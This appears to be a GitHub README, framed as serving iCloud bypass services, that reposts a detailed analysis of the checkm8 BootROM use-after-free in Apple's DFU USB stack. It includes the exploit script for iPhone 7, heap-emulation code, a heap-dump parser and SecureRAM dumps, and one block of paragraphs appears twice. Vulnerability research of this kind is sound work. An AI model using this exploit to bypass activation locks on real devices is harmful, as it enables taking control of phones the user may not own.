# iCloud-Bypass-Namibia
![Orange Black Hummingbird Tech, Digital Bird Logo Template](https://user-images.githubusercontent.com/106577954/219881527-8db504ce-9760-48cc-b3fb-8fb27270a809.png)


A repository for iOS BootROM exploits as used by Checkm8 and other iOS Bypass service providers.  
Yo, bro, this might be a long read, I didn't write this myself; It was written by the Checkm8 team so all credits go to them. This read will equip you with how the process works. Have fun!!

Basics:

First things first. Let’s take a quick-look at iDevice booting process itself and a role of the BootROM (or Secure ROM) in this process.

Below, you’ll find the flow chart presenting the Apple Device booting process.


BootROM is the first thing executed when a device is turned on. Main tasks it performs are:

Platform initialization (required platform registers are installed, CPU is initialized, etc.)
Verification and control transfer to the next stage
BootROM supports IMG3/IMG4 images parsing
BootROM has access to the GID key which allows decrypting images
BootROM contains built-in Public Apple Key and required cryptographic capacities facilitating image verification
If further booting is impossible, restore the device (Device Firmware Update or DFU)
BootROM can be considered as iBoot light version due to its very small size. They also share most of the system and library code. The main difference between BootROM and iBoot is that BootROM can’t be updated as it is placed in the internal memory, which is read only, during the manufacturing process. BootROM is the root of trust for the hardware within the secure boot chain. BootROM vulnerabilities are the trap-door making it possible for attackers to take control over the booting process and run unsigned code execution on devices.

Chekm8 History


Checkm8 exploit author axi0mX added it to ipwndfu on September 27, 2019. He used Twitter to announce the update at the same time. His tweet contained the exploit description and additional information. The thread said that he found the use-after-free vulnerability in the USB code during iBoot patch diffing for iOS 12 beta version back in the Summer 2018. As we know, iBoot and BootROM share much of their code, including USB code. Therefore, this vulnerability is applicable to BootROM as well.

In terms of the exploit’s code, the mentioned vulnerability takes advantage of DFU. DFU is the mode allowing a user to move a signed image to a device using USB for later booting. For example, this can be a solution for a device restoring in case an update has failed.

The same day, littlelailo user claimed that this vulnerability was found by him in March and its description was published in apollo.txt. The vulnerability description was presented to checkm8. However, some details weren’t clear enough in it. This is the reason why this article is written with aim to explain all the exploitation details all the way up to the payload execution in BootROM.

The aforementioned sources became the basis for our analysis, as well as the source code leaked in February 2018. In addition, we use data stemming from our own experiments on the test device, namely iPhone 7 (CPID:8010). The SecureRAM and SecureROM dumps were received via checkm8. It was a useful input to the analysis.

Basic USB Information

As far as we’ve discovered that USB code is the vulnerability source, obviously, we should figure out how exactly this interface works. https://www.usb.org/ will give you the overall information. But this is quite a long read. NutShell’s USB information is good for our needs. We’ll highlight the most essential aspects.

There are multiple types of data transfer via USB. In the case of DFU, Control Transfer mode is the only type used (more information here). Each transaction goes through three stages in this mode which are:

Setup Stage – SETUP packet is sent and it includes following fields:
bmRequestType – its work is to identify the request’s direction, type and recipient
bRequest – identifies the request to be made
wValue, wIndex – are interpreted in dependence to the request
wLength – indicates the length of the data sent/received in Data Stage
Data Stage is an optional data transfer stage. Based on the SETUP packet sent during the Setup Stage, the data can be sent from host to the device (OUT) or from the device to the host (IN). Any data is sent by small portions. If we speak of Apple DFU, it’s 0x40 bytes only.
When a host is to send another data batch, it first sends an OUT token and afterwards, it sends the data.
When a host is ready to accept data sent from a device, it sends an IN token to the device.
Status Stage – this is the final stage when the entire transaction status is reported.
In case of OUT request, the host sends an IN token and the device must respond with a zero-length packet.
In case of IN request, the host sends an OUT token and a zero-length packet.
Below you’ll find the scheme depicting both OUT and IN requests. We’ve purposely removed ACK, NACK and other handshake bursts because they are not essential for the exploit.


Apollo.txt Analysis

We started our analysis with the vulnerability described in apollo.txt. The algorithm of the DFU mode is the subject of this document.

https://gist.github.com/littlelailo/42c6a11d31877f98531f6d30444f59c4

When usb is started to get an image over dfu, dfu registers an interface to handle all the commands and allocates a buffer for input and output
if you send data to dfu the setup packet is handled by the main code which then calls out to the interface code
the interface code verifies that wLength is shorter than the input output buffer length and if that’s the case it updates a pointer passed as an argument with a pointer to the input output buffer
it then returns wLength which is the length it wants to recieve into the buffer
the usb main code then updates a global var with the length and gets ready to recieve the data packages
if a data package is recieved it gets written to the input output buffer via the pointer which was passed as an argument and another global variable is used to keep track of how many bytes were recieved already
if all the data was recieved the dfu specific code is called again and that then goes on to copy the contents of the input output buffer to the memory location from where the image is later booted
after that the usb code resets all variables and goes on to handel new packages
if dfu exits the input output buffer is freed and if parsing of the image fails bootrom reenters dfu
The first thing we did was these steps check VS iBoot source code. The leaked code fragments can’t be used here. For this reason, we’ll use an abstract code received via SecureROM reverse engineering of the tested iPhone 7 in IDA. The iBoot source code is easy to find and navigate.

Once DFU initialization is done, I0 buffer allocation and USB interface registration for the request to DFU processing are completed you’ll see the screen below:


Once the request to DFU SETUP packet comes in, the correspond interface handler is called. In case of OUT requests (like an image is sent), if the execution is successful, the handler must return the I0 buffer address for the transaction along with the data length to be received. Both values are stored in global variables.


The following screenshot depicts the DFU interface handler. In case of correct request, I0 buffer address allocated while DFU initialization and length of the data expected from the SETUP packet will be returned.


At the time of the Data Stage, each data batch will be written in to the I0 buffer address. After that, the I0 buffer address will be offset and received counter will be updated. Once all the data expected is received, the interface data handler is called and global transaction state is cleared.


In the DFU data handler, the data received is moved to the memory area to be loaded from there later. For Apple devices, this area is called INSECURE_MEMORY based on the iBoot source code.


Once the device exits the DFU mode, the I0 buffer allocated previously gets free. In case the image acquiring was successful in the DFU mode, it will be verified and booted. The DFU will be initialized again in case any error occurred during the process or the image was impossible to boot. This means that the entire process will be started over from the very beginning.

The use-after-free vulnerability is located in the algorithm described above. In case we send a SETUP packet during the image uploading and the transaction is completed with Data Stage skipping, the global state remains initialized during the next DFU cycle. This way, we can write to the I0 buffer the address allocated in the course of the previous DFU iteration.

This is how use-after-free works. But how anything can be overwritten during the next DFU iteration? The answer is that all the resources allocated previously will be free and the memory allocation in a new iteration must be absolutely the same before the new DFU initialization. It emerged, that there is one more quite an interesting memory leak error making use-after-free exploit possible.

Checkm8 Analysis

Let’s turn to chekm8. For the purpose of the demonstration, we’ll use a simplified exploit version for iPhone 7. The simplified version means that we’ve removed the entire code for other platforms and changed USB requests order and types which didn’t harm its functionality. Another thing removed is a payload building process included in the original file – checkm8.py. The difference between versions for other devices is obvious.

#!/usr/bin/env python

from checkm8 import *

def main():
    print '*** checkm8 exploit by axi0mX ***'

    device = dfu.acquire_device(1800)
    start = time.time()
    print 'Found:', device.serial_number
    if 'PWND:[' in device.serial_number:
        print 'Device is already in pwned DFU Mode. Not executing exploit.'
        return

    payload, _ = exploit_config(device.serial_number)
    t8010_nop_gadget = 0x10000CC6C
    callback_chain = 0x1800B0800
    t8010_overwrite = '\0' * 0x5c0
    t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)

    # heap feng-shui
    stall(device)
    leak(device)
    for i in range(6):
        no_leak(device)
    dfu.usb_reset(device)
    dfu.release_device(device)

    # set global state and restart usb
    device = dfu.acquire_device()
    device.serial_number
    libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001)
    libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0)
    dfu.release_device(device)

    time.sleep(0.5)

    # heap occupation
    device = dfu.acquire_device()
    device.serial_number
    stall(device)
    leak(device)
    leak(device)
    libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50)
    for i in range(0, len(payload), 0x800):
        libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0,
                                       payload[i:i+0x800], 50)
    dfu.usb_reset(device)
    dfu.release_device(device)

    device = dfu.acquire_device()
    if 'PWND:[checkm8]' not in device.serial_number:
        print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.'
        sys.exit(1)
    print 'Device is now in pwned DFU Mode.'
    print '(%0.2f seconds)' % (time.time() - start)
    dfu.release_device(device)

if __name__ == '__main__':
    main()
Checkm8 operation consists of six stages:

Heap feng-shui
I0 buffer allocation and freeing without global state cleaning
usb_device_io_request overwriting in the heap with use-after-free
Payload placing
Callback-chain execution
Shellcode execution
Now we’ll take a closer look at each of these stages.

Heap feng-shui

In our opinion, this stage is the most interesting one. Therefore, we’ll take our time to outline it in detail.

stall(device)
leak(device)
for i in range(6):
    no_leak(device)
dfu.usb_reset(device)
dfu.release_device(device)
Heap feng-shui stage is essential for proper heap arrangement in the way providing benefit for use-after-free exploitation. First of all, we should take a look at stall, leak, no_leak calls:

def stall(device):   libusb1_async_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 'A' * 0xC0, 0.00001)
def leak(device):    libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC0, 1)
def no_leak(device): libusb1_no_error_ctrl_transfer(device, 0x80, 6, 0x304, 0x40A, 0xC1, 1)
libusb1_no_error_ctrl_transfer is device.ctrlTransfer wrapper which ignores all exceptions while a request execution. libusb1_async_ctrl_transfer is libusb_submit_transfer function wrapper from libusb for a request nonsynchronous execution.

Parameters listed below are passed to these calls:

Device number
SETUP packet data (description can be found here):
bmRequestType
bRequest
wValue
wIndex
Data length (wLength) or Data Stage data
Request timeout
All three types of requests share following arguments: bmRequestType, bRequest, wValue and wIndex.

bmRequestType = 0x80
0b1XXXXXXX — Data Stage direction (Device to Host)
0bX00XXXXX — standard type of the request
0bXXX00000 — recipient device of the request
bRequest = 6 —get a descriptor request (GET_DESCRIPTOR)
wValue = 0x304
wValueHigh = 0x3 — defines the descriptor type — string (USB_DT_STRING)
wValueLow = 0x4 —the string descriptor index, 4, is associated with the device’s serial number (in our case, the string is CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33])
wIndex = 0x40A – is the string language identifier. Its value can be changed as it’s not associated with the exploitation.
0x30 bytes are allocated for any type of these requests in the heap for an object having the following structure:


callback and next fields are the most interesting ones.

callback points to the function to be called after the request is made.
next points the next object of the same type. It’s crucial for the request wait list arrangement.
The stall key feature is that it uses nonsynchronous request execution with a minimum timeout. This is the reason why we are lucky because OS will cancel the request and it will remain in the execution wait list. This way, the transaction will remain incomplete. In addition, the device still will be receiving all forthcoming SETUP packets and placing them in the execution wait list on as-needed basis. During our further experiments with USB controller on Arduino, it turned out that successful exploitation requires SETUP packet and IN token sending by the host. Once it is done, the transaction has to be cancelled because of timeout.

Here is how incomplete transaction looks like:


In addition, the only difference between the requests lies in their length which is by one unit. There is a standard callback for standard requests. It looks like this:


The io_length value is equal to the minimum from wLength in the SETUP packet of the request, as well as the original length of the descriptor requested. Given that the descriptor is long enough, io_length value can be controlled within it. The g_setup_request.wLength value is equal to the wLength value from the last SETUP packet. In this scenario, it’s 0xC1.

Thereby, the requests formed by stall and leak calls will be completed, the condition in the callback function terminal will be fulfilled and usb_core_send_zlp() will be called. This call creates a null packet, or zero-length-packet, and puts it to the execution wait list. This is a requirement to complete the transaction correctly in the Status Sage.

The usb_core_complete_endpoint_io function calling is the completion of the request. It calls callback first and frees the request’s memory afterwards. There are two signs allowing considering the request completed: the whole transaction completion and USB reset. Once USB reset signal is received, all the requests in the execution wait list are completed.

We can obtain certain control over the heap for use-after-free exploitation via selective usb_core_send_zlp() calling while going through the execution wait list and further requests freeing. Let’s take a look on how the request cleanup loop looks like:


The io_length value is equal to the minimum from wLength in the SETUP packet of the request, as well as the original length of the descriptor requested. Given that the descriptor is long enough, io_length value can be controlled within it. The g_setup_request.wLength value is equal to the wLength value from the last SETUP packet. In this scenario, it’s 0xC1.

Thereby, the requests formed by stall and leak calls will be completed, the condition in the callback function terminal will be fulfilled and usb_core_send_zlp() will be called. This call creates a null packet, or zero-length-packet, and puts it to the execution wait list. This is a requirement to complete the transaction correctly in the Status Sage.

The usb_core_complete_endpoint_io function calling is the completion of the request. It calls callback first and frees the request’s memory afterwards. There are two signs allowing considering the request completed: the whole transaction completion and USB reset. Once USB reset signal is received, all the requests in the execution wait list are completed.

We can obtain certain control over the heap for use-after-free exploitation via selective usb_core_send_zlp() calling while going through the execution wait list and further requests freeing. Let’s take a look on how the request cleanup loop looks like:


A new memory is allocated from the smallest appropriate free chunk in the SecureROM heap. A small free chunk creation using the aforementioned approach gives us control over the memory allocation during the USB initialization, including io_buffer and requests allocation.

A glance at which requests to the heap are made after DFU initialization will give us a clear picture of this process. We’ve received the following sequence during the iBoot source code and SecureROM reverse-engineering analysis:

 
Various string descriptors allocation
1.1. Nonce (size 234)
1.2. Manufacturer (22)
1.3. Product (62)
1.4. Serial Number (198)
1.5. Configuration string (62)
 
Allocations related to USB controller task creation
2.1. Task structure (0x3c0)
2.2. Task stack (0x1000)
 
io_buffer (0x800)
 
Configuration descriptors
4.1. High-Speed (25)
4.2. Full-Speed (25)
The next step is requests structures allocation. In case a small chunk is placed in the heap, this is where some first category allocations will go to. This means that all other allocations will move. This will allow us to overflow usb_device_io_request via reference to the old buffer. This is how it looks like:


What we did for necessary offset calculation was emulation of all the allocations mentioned above and some iBoot heap source code adaptation.

Heap requests emulation in DFU

#include "heap.h"
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>

#ifndef NOLEAK
#define NOLEAK (8)
#endif

int main() {
    void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    printf("chunk = %p\n", chunk);
    heap_add_chunk(chunk, 0x100000, 1);
    malloc(0x3c0); // alignment of the low order bytes of addresses in SecureRAM

    void * descs[10];
    void * io_req[100];
    descs[0] = malloc(234);
    descs[1] = malloc(22);
    descs[2] = malloc(62);
    descs[3] = malloc(198);
    descs[4] = malloc(62);

    const int N = NOLEAK;

    void * task = malloc(0x3c0);
    void * task_stack = malloc(0x4000);

    void * io_buf_0 = memalign(0x800, 0x40);
    void * hs = malloc(25);
    void * fs = malloc(25);

    void * zlps[2];

    for(int i = 0; i < N; i++)
    {
        io_req[i] = malloc(0x30);
    }

    for(int i = 0; i < N; i++)
    {
        if(i < 2)
        {
            zlps[i] = malloc(0x30);
        }
        free(io_req[i]);
    }

    for(int i = 0; i < 5; i++)
    {
       printf("descs[%d]  = %p\n", i, descs[i]);
    }

    printf("task = %p\n", task);
    printf("task_stack = %p\n", task_stack);
    printf("io_buf = %p\n", io_buf_0);
    printf("hs = %p\n", hs);
    printf("fs = %p\n", fs);

    for(int i = 0; i < 2; i++)
    {
       printf("zlps[%d]  = %p\n", i, zlps[i]);
    }

    printf("**********\n");

    for(int i = 0; i < 5; i++)
    {
        free(descs[i]);
    }

    free(task);
    free(task_stack);
    free(io_buf_0);
    free(hs);
    free(fs);

    descs[0] = malloc(234);
    descs[1] = malloc(22);
    descs[2] = malloc(62);
    descs[3] = malloc(198);
    descs[4] = malloc(62);

    task = malloc(0x3c0);
    task_stack = malloc(0x4000);
    void * io_buf_1 = memalign(0x800, 0x40);
    hs = malloc(25);
    fs = malloc(25);

    for(int i = 0; i < 5; i++)
    {
       printf("descs[%d]  = %p\n", i, descs[i]);
    }

    printf("task = %p\n", task);
    printf("task_stack = %p\n", task_stack);
    printf("io_buf = %p\n", io_buf_1);
    printf("hs = %p\n", hs);
    printf("fs = %p\n", fs);

    for(int i = 0; i < 5; i++)
    {
        io_req[i] = malloc(0x30);
        printf("io_req[%d] = %p\n", i, io_req[i]);
    }

    printf("**********\n");
    printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0);
    printf("hs_off  = %#lx\n", (int64_t)hs - (int64_t)io_buf_0);
    printf("fs_off  = %#lx\n", (int64_t)fs - (int64_t)io_buf_0);

    return 0;
}
Here is the program output with 8 requests at the heap feng-shui stage:

chunk = 0x1004000
descs[0]  = 0x1004480
descs[1]  = 0x10045c0
descs[2]  = 0x1004640
descs[3]  = 0x10046c0
descs[4]  = 0x1004800
task = 0x1004880
task_stack = 0x1004c80
io_buf = 0x1008d00
hs = 0x1009540
fs = 0x10095c0
zlps[0]  = 0x1009a40
zlps[1]  = 0x1009640
**********
descs[0]  = 0x10096c0
descs[1]  = 0x1009800
descs[2]  = 0x1009880
descs[3]  = 0x1009900
descs[4]  = 0x1004480
task = 0x1004500
task_stack = 0x1004900
io_buf = 0x1008980
hs = 0x10091c0
fs = 0x1009240
io_req[0] = 0x10092c0
io_req[1] = 0x1009340
io_req[2] = 0x10093c0
io_req[3] = 0x1009440
io_req[4] = 0x10094c0
**********
io_req_off = 0x5c0
hs_off  = 0x4c0
fs_off  = 0x540
This way, one more usb_device_io_request will show up at 0x5c0 offset from the previous buffer beginning which complies with the exploit’s code:

t8010_overwrite = '\0' * 0x5c0
t8010_overwrite += struct.pack('<32x2Q', t8010_nop_gadget, callback_chain)
These conclusions validity can be verified via SecureRAM heap current status analysis received with checkm8. To do so, we wrote a simple script parsing the heap’s dump and enumerating the chunks. Note that a part of metadata was damaged during the usb_device_io_request overflow. This is the reason why we skip it in the analysis.

#!/usr/bin/env python3

import struct
from hexdump import hexdump

with open('HEAP', 'rb') as f:
    heap = f.read()

cur = 0x4000

def parse_header(cur):
    _, _, _, _, this_size, t = struct.unpack('<QQQQQQ', heap[cur:cur + 0x30])
    is_free = t & 1
    prev_free = (t >> 1) & 1
    prev_size = t >> 2
    this_size *= 0x40
    prev_size *= 0x40
    return this_size, is_free, prev_size, prev_free

while True:
    try:
        this_size, is_free, prev_size, prev_free = parse_header(cur)
    except Exception as ex:
        break
    print('chunk at', hex(cur + 0x40))
    if this_size == 0:
        if cur in (0x9180, 0x9200, 0x9280):  # skipping damaged chunks
            this_size = 0x80
        else:
            break
    print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free)
    hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)])
    cur += this_size
You can find the script output along with comments under the spoiler. It shows that low order bytes fit the emulation results.

The result of the heap parsing in SecureRAM

chunk at 0x4040
0x40 non-free 0x0 0
chunk at 0x4080
0x80 non-free 0x40 0
00000000: 00 41 1B 80 01 00 00 00  00 00 00 00 00 00 00 00  .A..............
00000010: 00 00 00 00 00 00 00 00  00 01 00 00 00 00 00 00  ................
00000020: FF 00 00 00 00 00 00 00  68 3F 08 80 01 00 00 00  ........h?......
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x4100
0x140 non-free 0x80 0
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
chunk at 0x4240
0x240 non-free 0x140 0
00000000: 68 6F 73 74 20 62 72 69  64 67 65 00 00 00 00 00  host bridge.....
00000010: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
chunk at 0x4480  // descs[4], conf string
0x80 non-free 0x240 0
00000000: 3E 03 41 00 70 00 70 00  6C 00 65 00 20 00 4D 00  >.A.p.p.l.e. .M.
00000010: 6F 00 62 00 69 00 6C 00  65 00 20 00 44 00 65 00  o.b.i.l.e. .D.e.
00000020: 76 00 69 00 63 00 65 00  20 00 28 00 44 00 46 00  v.i.c.e. .(.D.F.
00000030: 55 00 20 00 4D 00 6F 00  64 00 65 00 29 00 FE FF  U. .M.o.d.e.)...
chunk at 0x4500  // task
0x400 non-free 0x80 0
00000000: 6B 73 61 74 00 00 00 00  E0 01 08 80 01 00 00 00  ksat............
00000010: E8 83 08 80 01 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  02 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000040: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000050: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000060: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000070: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000080: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000090: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000A0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
chunk at 0x4900  // task stack
0x4080 non-free 0x400 0
00000000: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000010: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000020: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000030: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000040: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000050: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000060: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000070: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000080: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
00000090: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
000000A0: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
000000B0: 6B 61 74 73 6B 61 74 73  6B 61 74 73 6B 61 74 73  katskatskatskats
chunk at 0x8980  // io_buf
0x840 non-free 0x4080 0
00000000: 63 6D 65 6D 63 6D 65 6D  00 00 00 00 00 00 00 00  cmemcmem........
00000010: 10 00 0B 80 01 00 00 00  00 00 1B 80 01 00 00 00  ................
00000020: EF FF 00 00 00 00 00 00  10 08 0B 80 01 00 00 00  ................
00000030: 4C CC 00 00 01 00 00 00  20 08 0B 80 01 00 00 00  L....... .......
00000040: 4C CC 00 00 01 00 00 00  30 08 0B 80 01 00 00 00  L.......0.......
00000050: 4C CC 00 00 01 00 00 00  40 08 0B 80 01 00 00 00  L.......@.......
00000060: 4C CC 00 00 01 00 00 00  A0 08 0B 80 01 00 00 00  L...............
00000070: 00 06 0B 80 01 00 00 00  6C 04 00 00 01 00 00 00  ........l.......
00000080: 00 00 00 00 00 00 00 00  78 04 00 00 01 00 00 00  ........x.......
00000090: 00 00 00 00 00 00 00 00  B8 A4 00 00 01 00 00 00  ................
000000A0: 00 00 0B 80 01 00 00 00  E4 03 00 00 01 00 00 00  ................
000000B0: 00 00 00 00 00 00 00 00  34 04 00 00 01 00 00 00  ........4.......
chunk at 0x91c0  // hs config
0x80 non-free 0x0 0
00000000: 09 02 19 00 01 01 05 80  FA 09 04 00 00 00 FE 01  ................
00000010: 00 00 07 21 01 0A 00 00  08 00 00 00 00 00 00 00  ...!............
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
chunk at 0x9240  // ls config
0x80 non-free 0x0 0
00000000: 09 02 19 00 01 01 05 80  FA 09 04 00 00 00 FE 01  ................
00000010: 00 00 07 21 01 0A 00 00  08 00 00 00 00 00 00 00  ...!............
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
chunk at 0x92c0
0x80 non-free 0x0 0
00000000: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000010: 01 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 6C CC 00 00 01 00 00 00  00 08 0B 80 01 00 00 00  l...............
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x9340
0x80 non-free 0x80 0
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................
00000010: FF FF FF FF C0 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 48 DE 00 00 01 00 00 00  C0 93 1B 80 01 00 00 00  H...............
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x93c0
0x80 non-free 0x80 0
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  40 94 1B 80 01 00 00 00  ........@.......
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x9440
0x80 non-free 0x80 0
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x94c0
0x180 non-free 0x80 0
00000000: E4 03 43 00 50 00 49 00  44 00 3A 00 38 00 30 00  ..C.P.I.D.:.8.0.
00000010: 31 00 30 00 20 00 43 00  50 00 52 00 56 00 3A 00  1.0. .C.P.R.V.:.
00000020: 31 00 31 00 20 00 43 00  50 00 46 00 4D 00 3A 00  1.1. .C.P.F.M.:.
00000030: 30 00 33 00 20 00 53 00  43 00 45 00 50 00 3A 00  0.3. .S.C.E.P.:.
00000040: 30 00 31 00 20 00 42 00  44 00 49 00 44 00 3A 00  0.1. .B.D.I.D.:.
00000050: 30 00 43 00 20 00 45 00  43 00 49 00 44 00 3A 00  0.C. .E.C.I.D.:.
00000060: 30 00 30 00 31 00 41 00  34 00 30 00 33 00 36 00  0.0.1.A.4.0.3.6.
00000070: 32 00 30 00 34 00 35 00  45 00 35 00 32 00 36 00  2.0.4.5.E.5.2.6.
00000080: 20 00 49 00 42 00 46 00  4C 00 3A 00 33 00 43 00   .I.B.F.L.:.3.C.
00000090: 20 00 53 00 52 00 54 00  47 00 3A 00 5B 00 69 00   .S.R.T.G.:.[.i.
000000A0: 42 00 6F 00 6F 00 74 00  2D 00 32 00 36 00 39 00  B.o.o.t.-.2.6.9.
000000B0: 36 00 2E 00 30 00 2E 00  30 00 2E 00 31 00 2E 00  6...0...0...1...
chunk at 0x9640  // zlps[1]
0x80 non-free 0x180 0
00000000: 80 00 00 00 00 00 00 00  00 89 08 80 01 00 00 00  ................
00000010: FF FF FF FF 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000020: 00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  ................
00000030: F0 F1 F2 F3 F4 F5 F6 F7  F8 F9 FA FB FC FD FE FF  ................
chunk at 0x96c0  // descs[0], Nonce
0x140 non-free 0x80 0
00000000: EA 03 20 00 4E 00 4F 00  4E 00 43 00 3A 00 35 00  .. .N.O.N.C.:.5.
00000010: 35 00 46 00 38 00 43 00  41 00 39 00 37 00 41 00  5.F.8.C.A.9.7.A.
00000020: 46 00 45 00 36 00 30 00  36 00 43 00 39 00 41 00  F.E.6.0.6.C.9.A.
00000030: 41 00 31 00 31 00 32 00  44 00 38 00 42 00 37 00  A.1.1.2.D.8.B.7.
00000040: 43 00 46 00 33 00 35 00  30 00 46 00 42 00 36 00  C.F.3.5.0.F.B.6.
00000050: 35 00 37 00 36 00 43 00  41 00 41 00 44 00 30 00  5.7.6.C.A.A.D.0.
00000060: 38 00 43 00 39 00 35 00  39 00 39 00 34 00 41 00  8.C.9.5.9.9.4.A.
00000070: 46 00 32 00 34 00 42 00  43 00 38 00 44 00 32 00  F.2.4.B.C.8.D.2.
00000080: 36 00 37 00 30 00 38 00  35 00 43 00 31 00 20 00  6.7.0.8.5.C.1. .
00000090: 53 00 4E 00 4F 00 4E 00  3A 00 42 00 42 00 41 00  S.N.O.N.:.B.B.A.
000000A0: 30 00 41 00 36 00 46 00  31 00 36 00 42 00 35 00  0.A.6.F.1.6.B.5.
000000B0: 31 00 37 00 45 00 31 00  44 00 33 00 39 00 32 00  1.7.E.1.D.3.9.2.
chunk at 0x9800  // descs[1], Manufacturer
0x80 non-free 0x140 0
00000000: 16 03 41 00 70 00 70 00  6C 00 65 00 20 00 49 00  ..A.p.p.l.e. .I.
00000010: 6E 00 63 00 2E 00 D6 D7  D8 D9 DA DB DC DD DE DF  n.c.............
00000020: E0 E1 E2 E3 E4 E5 E6 E7  E8 E9 EA EB EC ED EE EF  ................
